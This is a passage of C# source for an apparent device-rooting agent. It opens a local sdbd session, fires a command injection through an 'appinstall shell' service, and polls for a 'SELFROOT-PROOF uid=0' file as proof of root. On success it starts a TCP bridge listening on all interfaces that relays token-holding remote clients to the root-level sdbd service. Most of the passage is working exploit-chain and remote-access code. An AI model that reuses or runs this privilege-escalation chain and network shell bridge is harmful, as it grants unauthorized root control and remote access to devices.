                    Progress = 0.35;
                }
                Note("sdbd answered localhost handshake (attempt " + attempt + ")", 0.35);

                using (s)
                {
                    s.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));
                    string c; uint a0; byte[] p;
                    var capDeadline = DateTime.UtcNow.AddSeconds(10);
                    while (DateTime.UtcNow < capDeadline)
                    {
                        var capStatus = ReadFrame(s, out c, out a0, out _, out p);
                        if (capStatus == ReadStatus.Closed) break;
                        if (capStatus == ReadStatus.Timeout) continue;   // keep waiting
                        if (c == "OKAY") { s.Send(Frame("OKAY", 0x10, a0, new byte[0])); break; }
                        if (c == "CLSE") break;
                    }
                    Note("capability handshake done", 0.45);

                    var service = Encoding.ASCII.GetBytes("shell:" + argument + "\0");
                    s.Send(Frame("OPEN", 0x12, 0, service));
                    Note("injection fired via appinstall shell", 0.60);

                    // v5.1: 15s window; a TIMEOUT now keeps polling until the
                    // deadline (v4/v5 broke on the first 2-3s quiet read and
                    // logged nothing). Frames stay advisory — the proof poll
                    // is the single source of truth.
                    var frameLog = new List<string>();
                    var deadline = DateTime.UtcNow.AddSeconds(15);
                    s.ReceiveTimeout = 3000;
                    uint serviceId = 0x12;
                    while (DateTime.UtcNow < deadline)
                    {
                        uint fArg0; uint fArg1;
                        var frameStatus = ReadFrame(s, out c, out fArg0, out fArg1, out p);
                        if (frameStatus == ReadStatus.Closed) break;
                        if (frameStatus == ReadStatus.Timeout) continue;   // quiet socket: keep waiting
                        frameLog.Add(c);
                        if (c == "OKAY" || c == "WRTE")
                        {
                            try { s.Send(Frame("OKAY", serviceId, fArg0, new byte[0])); } catch { }
                        }
                        if (c == "CLSE") break;
                    }
                    s.ReceiveTimeout = 10000;
                    Note("injection frames: " + (frameLog.Count > 0
                        ? string.Join(",", frameLog) : "(none within 15s - advisory only)"), 0.65);
                }

                lock (Gate)
                {
                    Banner = "ROOT CHAIN RUNNING";
                    BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
                }

                // v5: modules (e.g. the ad-daemon mask/stop loop) can take
                // minutes, and the outer script copies the EV proof late — so
                // launch.sh now also writes the proof to EV directly from the
                // root context. Poll BOTH paths for up to 6 minutes.
                const int pollTotal = 120;              // 120 x 3s = 6 min
                for (int i = 0; i < pollTotal; i++)
                {
                    Thread.Sleep(3000);
                    bool proof = false;
                    string proofText = null;
                    foreach (var proofPath in new[]
                    {
                        Evidence + "/selfroot-proof.txt",   // early root-context copy (v5)
                        "/tmp/selfroot-proof.txt",          // tar launch.sh copy
                    })
                    {
                        try
                        {
                            if (!File.Exists(proofPath)) continue;
                            if (File.GetLastWriteTimeUtc(proofPath) < bootStarted.AddSeconds(-5)) continue;
                            var text = File.ReadAllText(proofPath);
                            if (!text.Contains("SELFROOT-PROOF uid=0")) continue;
                            proof = true;
                            proofText = text;
                            break;
                        }
                        catch { }
                    }
                    lock (Gate) { Progress = 0.70 + 0.29 * (i / (double)pollTotal); }
                    if (i % 8 == 0) Note("polling for proof " + (i + 1) + "/" + pollTotal, 0.70 + 0.29 * (i / (double)pollTotal));
                    if (proof)
                    {
                        try { Note("PROOF:\n" + proofText, 1.0); } catch { }
                        Persist("root proof acquired via chain");
                        lock (Gate)
                        {
                            Banner = "ROOT ACQUIRED - UNTETHERED";
                            BannerColor = new Color(0.2f, 1f, 0.3f, 1f);
                            Progress = 1.0;
                        }
                        StartBridge();
                        return;
                    }
                }
                lock (Gate)
                {
                    Banner = "NO FRESH PROOF AFTER 6 MIN";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    BridgeStatus = "not started (root proof missing)";
                }
                Persist("no fresh proof after 6 min");
                Note("next boot retries automatically", 0);
            }
            catch (Exception e)
            {
                lock (Gate)
                {
                    Banner = "AGENT ERROR";
                    BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
                    BridgeStatus = "agent error";
                }
                Persist("EXCEPTION " + e.GetType().Name + ": " + e.Message);
                Note("EXCEPTION " + e.GetType().Name + ": " + e.Message, 0);
            }
        });
    }

    private static void StartBridge()
    {
        try
        {
            var token = File.ReadAllText(BridgeConfig).Trim();
            if (!IsBridgeToken(token))
            {
                Note("bridge unavailable: bridge.conf must contain 32 lowercase hex characters");
                return;
            }

            var bridgePort = DefaultBridgePort;
            if (File.Exists(BridgePortConfig)
                && (!int.TryParse(File.ReadAllText(BridgePortConfig).Trim(), out bridgePort)
                    || bridgePort < 1024
                    || bridgePort > 65535))
            {
                Note("bridge unavailable: bridge-port.conf must contain a port from 1024 to 65535");
                return;
            }

            var listener = new TcpListener(IPAddress.Any, bridgePort);
            listener.Start(8);
            lock (Gate)
            {
                BridgeStatus = "listening";
                UiDirty = true;
            }
            AddUiEvent("sdb bridge listening on port " + bridgePort);
            Task.Run(() => AcceptBridgeClients(listener, token));
        }
        catch (Exception error)
        {
            lock (Gate)
            {
                BridgeStatus = "unavailable: " + error.GetType().Name;
                UiDirty = true;
            }
            AddUiEvent("bridge unavailable: " + error.GetType().Name + ": " + error.Message);
        }
    }

    private static bool IsBridgeToken(string token)
    {
        if (token == null || token.Length != BridgeTokenLength) return false;
        foreach (var character in token)
        {
            if (!((character >= '0' && character <= '9')
                || (character >= 'a' && character <= 'f'))) return false;
        }
        return true;
    }

    private static void AcceptBridgeClients(TcpListener listener, string token)
    {
        while (true)
        {
            try
            {
                var client = listener.AcceptTcpClient();
                Task.Run(() => HandleBridgeClient(client, token));
            }
            catch (Exception error)
            {
                BridgeLog("listener stopped: " + error.GetType().Name);
                return;
            }
        }
    }

    private static void HandleBridgeClient(TcpClient client, string token)
    {
        var peer = "unknown";
        TcpClient upstream = null;
        try
        {
            peer = client.Client.RemoteEndPoint == null
                ? peer
                : client.Client.RemoteEndPoint.ToString();
            client.NoDelay = true;
            var clientStream = client.GetStream();
            clientStream.ReadTimeout = 5000;
            var received = new byte[BridgeTokenLength];
            var count = 0;
            try
            {
                while (count < received.Length)
                {
                    var read = clientStream.Read(received, count, received.Length - count);
                    if (read <= 0) break;
                    count += read;
                }
            }
            catch (IOException)
            {
                BridgeLog("rejected " + peer + " (token timeout)");
                return;
            }
            if (count != received.Length)
            {
                BridgeLog("rejected " + peer + " (missing or short token)");
                return;
            }
            if (!TokensMatch(received, token))
            {
                BridgeLog("rejected " + peer + " (wrong token)");
                return;
            }

            clientStream.ReadTimeout = Timeout.Infinite;
            upstream = new TcpClient(AddressFamily.InterNetwork);
            upstream.NoDelay = true;
            upstream.Connect(IPAddress.Loopback, SdbPort);
            BridgeLog("authorized " + peer);

            var upstreamStream = upstream.GetStream();
            var finished = new ManualResetEvent(false);
            var toSdbd = Task.Run(() => CopyBridgeStream(clientStream, upstreamStream, finished));
            var toClient = Task.Run(() => CopyBridgeStream(upstreamStream, clientStream, finished));
            finished.WaitOne();
            client.Close();
            upstream.Close();
            Task.WaitAll(new[] { toSdbd, toClient }, 1000);
            BridgeLog("closed " + peer);
        }
        catch (Exception error)
        {
            BridgeLog("connection " + peer + " failed: " + error.GetType().Name);
        }
        finally
        {
            try { client.Close(); } catch { }
            if (upstream != null) { try { upstream.Close(); } catch { } }
        }
    }

    private static bool TokensMatch(byte[] supplied, string expected)
    {
        var expectedBytes = Encoding.ASCII.GetBytes(expected);
        var difference = 0;
        for (int i = 0; i < BridgeTokenLength; i++)
        {
            difference |= supplied[i] ^ expectedBytes[i];
        }
        return difference == 0;
    }

    private static void CopyBridgeStream(
        NetworkStream source,
        NetworkStream destination,
        ManualResetEvent finished)
    {
        try
        {
            var buffer = new byte[65536];
            while (true)
            {
                var count = source.Read(buffer, 0, buffer.Length);
                if (count <= 0) break;
                destination.Write(buffer, 0, count);
            }
        }
        catch { }
        finally { finished.Set(); }
    }

    private static readonly object BridgeLogLock = new object();

    private static void BridgeLog(string message)
    {
        var line = DateTime.UtcNow.ToString("o") + " " + message + "\n";
        lock (BridgeLogLock)
        {
            try
            {
                Directory.CreateDirectory(Evidence);
                File.AppendAllText(Evidence + "/bridge.log", line);
            }
            catch { }
        }
        AddUiEvent("bridge " + message);
    }

    private static byte[] Frame(string cmd, uint arg0, uint arg1, byte[] data)
    {
        var c = Encoding.ASCII.GetBytes(cmd);
        uint check = 0;
        foreach (var b in data) check += b;
        var frame = new byte[24 + data.Length];
        Array.Copy(c, 0, frame, 0, 4);
        Array.Copy(BitConverter.GetBytes(arg0), 0, frame, 4, 4);
        Array.Copy(BitConverter.GetBytes(arg1), 0, frame, 8, 4);
        Array.Copy(BitConverter.GetBytes((uint)data.Length), 0, frame, 12, 4);
        Array.Copy(BitConverter.GetBytes(check), 0, frame, 16, 4);
        Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(c, 0)), 0, frame, 20, 4);
        Array.Copy(data, 0, frame, 24, data.Length);
        return frame;
    }

    private static readonly byte[] Cnxn =
    {
        0x43, 0x4e, 0x58, 0x4e, 0x00, 0x00, 0x10, 0x00,
        0x00, 0x00, 0x04, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x32, 0x02, 0x00, 0x00, 0xbc, 0xb1, 0xa7, 0xb1,
        0x68, 0x6f, 0x73, 0x74, 0x3a, 0x3a, 0x00
    };

    private static int ReadExact(Socket s, byte[] buffer, int needed)
    {
        int got = 0;
        while (got < needed)
        {
            int n;
            try { n = s.Receive(buffer, got, needed - got, SocketFlags.None); }
            catch (System.Net.Sockets.SocketException ex)
                when (ex.SocketErrorCode == System.Net.Sockets.SocketError.TimedOut)
            {
                return -1;   // no data yet — caller may retry within its deadline
            }
            catch { return got; }
            if (n <= 0) return got;
            got += n;
        }
        return got;
    }

    // v5.1: tri-state so a quiet socket (waiting for the injected command's
    // first WRTE, which can take seconds) is distinguishable from a dead one.
    // v4/v5 broke out of the frame log on the first read timeout and always
    // printed "injection frames: " empty.
    private enum ReadStatus { Ok, Timeout, Closed }

    private static ReadStatus ReadFrame(Socket s, out string cmd, out uint arg0, out uint arg1, out byte[] payload)
    {
        cmd = null; arg0 = 0; arg1 = 0; payload = new byte[0];
        var header = new byte[24];
        int got = ReadExact(s, header, 24);
        if (got == -1) return ReadStatus.Timeout;
        if (got < 24) return ReadStatus.Closed;
        cmd = Encoding.ASCII.GetString(header, 0, 4);
        arg0 = BitConverter.ToUInt32(header, 4);
        arg1 = BitConverter.ToUInt32(header, 8);
        uint len = BitConverter.ToUInt32(header, 12);
        payload = new byte[len];
        if (len > 0)
        {
            int gotPayload = ReadExact(s, payload, (int)Math.Min(len, 8192));
            if (gotPayload == -1 || gotPayload < (int)Math.Min(len, 8192))
            {
                return ReadStatus.Closed;   // stream broke mid-frame
            }
        }
        return ReadStatus.Ok;
    }

    private static bool TrySession(out Socket s)
    {
        s = null;
        try
        {
            s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 10000, SendTimeout = 10000
            };
            s.Connect("127.0.0.1", 26101);
            s.Send(Cnxn);
            string c; uint a0, a1; byte[] p;
            if (ReadFrame(s, out c, out a0, out a1, out p) != ReadStatus.Ok)
            {
                s.Close(); s = null; return false;
            }
            return true;
        }
        catch
        {
            if (s != null) { try { s.Close(); } catch { } }
            return false;
        }
    }

    public static void Main(string[] args)
    {
        new Agent().Run(args);
    }
}
